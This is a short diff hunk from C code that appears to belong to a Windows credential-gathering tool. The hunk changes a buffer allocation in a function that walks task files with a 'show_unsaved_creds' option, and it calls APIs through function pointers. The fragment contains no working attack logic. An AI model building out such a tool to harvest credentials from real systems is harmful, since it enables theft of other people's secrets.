@@ -681,7 +681,7 @@ int traverse_task_directory(const char* base_path, const char* current_subdir, c
                 fpCloseHandle(hFile);
                 
                 // Allocate buffer for file contents
-                char* buffer = (char*)fpVirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                char* buffer = (char*)fpVirtualAlloc(NULL, file_size + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 if (buffer) {
                     // Process the task file
                     if (process_task_file(full_path, findFileData.cFileName, target, save_dir, show_unsaved_creds,
